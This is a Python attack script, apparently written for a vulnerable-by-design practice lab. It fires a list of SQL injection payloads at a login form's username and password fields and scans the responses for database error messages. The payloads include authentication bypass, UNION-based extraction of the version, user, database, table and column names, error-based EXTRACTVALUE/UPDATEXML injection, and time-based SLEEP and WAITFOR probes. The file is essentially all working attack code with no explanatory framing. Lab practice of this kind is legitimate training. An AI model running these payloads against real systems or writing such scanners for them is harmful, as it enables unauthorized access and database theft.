#!/usr/bin/env python3
import requests
import time

# URL del target
url = "http://hackme1.vulnmachines.com/sqli/Error-based/Post-error-based-single.php"

# Payloads de SQL injection para probar
payloads = [
    # Error-based payloads
    "admin'",
    "admin' OR '1'='1",
    "admin' OR '1'='1' --",
    "admin' OR '1'='1' #",
    "admin' OR 1=1 --",
    "admin' OR 1=1 #",
    "admin' UNION SELECT 1,2,3 --",
    "admin' UNION SELECT 1,2,3,4,5 --",
    "admin' AND 1=1 --",
    "admin' AND 1=2 --",
    
    # Double quotes
    'admin"',
    'admin" OR "1"="1',
    'admin" OR "1"="1" --',
    
    # Integer based
    "1 OR 1=1",
    "1' OR '1'='1",
    "1' OR 1=1 --",
    
    # Time-based
    "admin'; WAITFOR DELAY '00:00:05' --",
    "admin' AND SLEEP(5) --",
    "admin' OR SLEEP(5) --",
    
    # Extractvalue and updatexml for error-based
    "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
    "admin' AND UPDATEXML(1, CONCAT(0x7e, (SELECT version()), 0x7e), 1) --",
    
    # Information gathering
    "admin' UNION SELECT version(),2,3 --",
    "admin' UNION SELECT user(),2,3 --",
    "admin' UNION SELECT database(),2,3 --",
    "admin' UNION SELECT table_name,2,3 FROM information_schema.tables --",
    "admin' UNION SELECT column_name,2,3 FROM information_schema.columns --",
]

def test_payload(payload, param="uname"):
    try:
        data = {
            "uname": payload if param == "uname" else "admin",
            "passwd": payload if param == "passwd" else "admin", 
            "login": "login"
        }
        
        print(f"\n[TESTING] {param}: {payload}")
        response = requests.post(url, data=data, timeout=10)
        
        # Buscar indicadores de SQL injection
        content = response.text.lower()
        
        # Buscar errores de base de datos
        error_indicators = [
            "mysql", "sql", "error", "warning", "fatal", "exception",
            "syntax error", "mysql_fetch", "mysql_num_rows", "mysql_result",
            "duplicate entry", "table", "column", "database", "query failed",
            "access denied", "unknown column", "table doesn't exist"
        ]
        
        found_errors = []
        for indicator in error_indicators:
            if indicator in content:
                found_errors.append(indicator)
        
        if found_errors:
            print(f"[SUCCESS] Found errors: {found_errors}")
            print(f"[RESPONSE LENGTH] {len(response.text)}")
            return True
        else:
            print(f"[NO ERRORS] Response length: {len(response.text)}")
            return False
            
    except Exception as e:
        print(f"[ERROR] {e}")
        return False

def main():
    print("=== SQL Injection Testing ===")
    print(f"Target: {url}")
    print("=" * 50)
    
    # Probar payloads en el parámetro uname
    print("\n[TESTING UNAME PARAMETER]")
    for payload in payloads:
        test_payload(payload, "uname")
        time.sleep(1)  # Evitar rate limiting
    
    # Probar payloads en el parámetro passwd
    print("\n[TESTING PASSWD PARAMETER]")
    for payload in payloads:
        test_payload(payload, "passwd")
        time.sleep(1)

if __name__ == "__main__":
    main()